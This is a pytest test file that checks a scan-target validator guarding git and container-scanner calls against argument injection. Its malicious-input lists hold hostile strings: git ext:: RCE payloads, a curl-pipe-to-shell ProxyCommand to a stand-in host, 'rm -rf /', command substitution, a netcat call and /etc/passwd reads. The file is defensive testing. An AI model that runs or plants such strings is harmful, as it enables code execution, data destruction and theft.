"""Tests for scan-target validation (the git/skopeo/trivy argv-injection guard).

These pin the RCE fix: a user-supplied scan target that could inject into a
subprocess must be rejected *before* any git/skopeo/docker/trivy invocation.
"""
from __future__ import annotations

import pytest

from app.target_validation import (
    UnsafeScanTarget,
    validate_container_image_target,
    validate_scan_target,
    validate_source_repo_target,
)


# --------------------------------------------------------------------------
# source_repo — the primary RCE vector (git clone / ls-remote)
# --------------------------------------------------------------------------

_MALICIOUS_REPO_TARGETS = [
    "ext::sh -c 'touch /tmp/pwned'",            # git transport-helper RCE
    "ext::sh -c whoami",
    "fd::17/foo",                                # another transport helper
    "--upload-pack=touch /tmp/pwned",           # leading-dash arg injection
    "-oProxyCommand=curl evil.sh|sh",
    "--output=/etc/cron.d/x",
    "file:///etc/passwd",                        # local transport
    "/etc/passwd",                               # bare local path (no scheme)
    "git@github.com:org/repo.git",               # scp-like (no scheme) → rejected
    "https://github.com/o/r\n--foo",             # embedded newline / control
    "https://exa mple.com/r",                    # whitespace
    "",                                          # empty
    "   ",
    "javascript://alert(1)",                     # disallowed scheme
    "https://",                                  # no host
]


@pytest.mark.parametrize("target", _MALICIOUS_REPO_TARGETS)
def test_source_repo_targets_are_rejected(target):
    with pytest.raises(UnsafeScanTarget):
        validate_source_repo_target(target)
    # And via the type-dispatching entrypoint used by the handlers.
    with pytest.raises(UnsafeScanTarget):
        validate_scan_target(target, "source_repo")


_SAFE_REPO_TARGETS = [
    "https://github.com/owner/repo",
    "https://github.com/owner/repo.git",
    "http://gitea.internal/owner/repo.git",
    "https://dev.azure.com/org/proj/_git/ANK%C3%96",   # percent-encoded path
    "git://git.example.com/repo.git",
    "ssh://git@github.com/owner/repo.git",
    "https://user:token@github.com/owner/repo.git",     # creds in URL are fine
]


@pytest.mark.parametrize("target", _SAFE_REPO_TARGETS)
def test_legitimate_repo_targets_are_accepted(target):
    validate_source_repo_target(target)          # must not raise
    validate_scan_target(target, "source_repo")


# --------------------------------------------------------------------------
# container_image — trivy/grype/skopeo/docker argv
# --------------------------------------------------------------------------

_MALICIOUS_IMAGE_TARGETS = [
    "-v",                                        # leading-dash arg injection
    "--config=/etc/x",
    "docker://evil",                             # scheme (scanner adds its own)
    "ext::sh -c x",
    "alpine; rm -rf /",                          # shell metachar / space
    "alpine`whoami`",
    "alpine$(whoami)",
    "alpine|nc evil 1",
    "img\nribbon",
    "",
]


@pytest.mark.parametrize("target", _MALICIOUS_IMAGE_TARGETS)
def test_image_targets_are_rejected(target):
    with pytest.raises(UnsafeScanTarget):
        validate_container_image_target(target)
    with pytest.raises(UnsafeScanTarget):
        validate_scan_target(target, "container_image")


_SAFE_IMAGE_TARGETS = [
    "alpine",
    "alpine:3.19",
    "library/nginx:1.27",
    "ghcr.io/owner/hecate-backend:latest",
    "ghcr.io/owner/img@sha256:" + "a" * 64,
    "registry.example.com:5000/team/app:1.2.3",
]


@pytest.mark.parametrize("target", _SAFE_IMAGE_TARGETS)
def test_legitimate_image_targets_are_accepted(target):
    validate_container_image_target(target)
    validate_scan_target(target, "container_image")


def test_unknown_type_is_not_validated():
    # sbom-import targets never reach a subprocess; must not raise.
    validate_scan_target("anything at all -- ::", "sbom-import")
